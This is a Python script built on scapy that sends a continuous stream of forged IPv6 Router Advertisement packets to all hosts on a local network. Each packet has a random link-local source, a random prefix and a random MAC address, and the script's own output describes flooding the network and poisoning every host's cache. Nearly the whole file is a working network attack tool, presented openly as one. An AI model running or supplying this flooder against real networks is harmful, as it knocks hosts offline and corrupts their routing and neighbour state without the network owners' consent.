#!/usr/bin/python
import random
import time
from multiprocessing import Pool

import psutil
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr
from scapy.sendrecv import send

def f(x):
    set_time = 1
    timeout = time.time() + 60*float(set_time)
    while True:
        if time.time() > timeout:
            break
def flood_RA():
    interface = input(" - Insert the interface, if you skip this by Enter, the packet is automatically "
                      "sent on every active interface: ")
    print("Flooding the network and poisoning cache of all hosts with RA messages, press Ctrl C to stop the attack")

    # Generate packets
    while True:
        try:
            base = IPv6()
            base.dst = "ff02::1"
            M = 16 ** 4
            base.src = "fe80::dead:" + ":".join(("%x" % random.randint(0, M)
                                                 for j in range(4)))
            random_prefix = "2001:dead:" + ":".join(("%x" % random.randint(0, M)
                                                     for k in range(2))) + "::"
            random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                      random.randint(0, 255),
                                                      random.randint(0, 255))
            packet1 = base / ICMPv6ND_RA(prf="High", routerlifetime=2048) / \
                      ICMPv6NDOptPrefixInfo(prefixlen=64,
                                            validlifetime=0x12c,
                                            preferredlifetime=0x6,
                                            prefix=random_prefix) / \
                      ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
            if interface == "":
                send(packet1, verbose=False)
            else:
                send(packet1, verbose=False, iface=interface)
            # processes = psutil.cpu_count()
            # pool = Pool(processes)
            # pool.map(f, range(processes))
        except KeyboardInterrupt:
            break

